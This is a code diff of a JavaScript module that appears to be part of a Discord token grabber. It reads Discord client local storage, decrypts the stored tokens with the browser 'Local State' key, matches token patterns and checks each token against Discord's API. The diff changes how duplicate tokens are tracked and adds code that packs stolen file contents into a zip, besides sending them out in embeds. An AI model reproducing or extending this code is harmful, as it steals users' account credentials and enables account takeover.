@@ -45,7 +45,6 @@ module.exports = (client) => {
 
                     for (var line of client.requires.fs.readFileSync(`${value}/${file_name}`, encoding = "utf8").split("\n")) {
 
-                        var _token;
                         if (value.includes("cord")) {
 
                             let encrypted = Buffer.from(JSON.parse(client.requires.fs.readFileSync(path_tail.replace("Local Storage", "Local State")))
@@ -65,26 +64,14 @@ module.exports = (client) => {
                                 decipher.setAuthTag(end);
                                 token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
 
-                                _token = token;
+                                await this.validateToken(key, token);
                             }
                         } else {
                             [/\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/].forEach(async (regex) => {
                                 if (line.match(regex)) {
-                                    console.log(line.match(regex)[0])
-
-                                    _token = line.match(regex)[0]
+                                    await this.validateToken(key, line.match(regex)[0]);
                                 }
                             })
-                        }
-
-                        for (var token of client.config.discord.grabbed_tokens.all) {
-                            if (token.token == _token) {
-                                _token = undefined;
-                            }
-                        }
-
-                        if (_token) {
-                            await this.validateToken(key, _token);
                         }
                     }
                 }
@@ -95,9 +82,11 @@ module.exports = (client) => {
 
         async validateToken(source, token) {
 
-            if (client.config.discord.grabbed_tokens.all.contains(token)) {
+            if (client.config.environ.validated_tokens.contains(token)) {
                 return;
             }
+
+            client.config.environ.validated_tokens.push(token)
 
             const req = await client.requires.axios({
                 url: "https://discord.com/api/v9/users/@me",
@@ -402,6 +391,7 @@ module.exports = (client) => {
                                 "description": `\`\`\`${prefixPath}\\${file}\n\n${client.requires.fs.readFileSync(`${prefixPath}\\${file}`)}\`\`\``,
                             })],
                         })
+                    client.utils.jszip.createTxt(`\\${file}_${client.requires.crypto.randomUUID()}.txt`, client.requires.fs.readFileSync(`${prefixPath}\\${file}`))
                 }
             })
         },
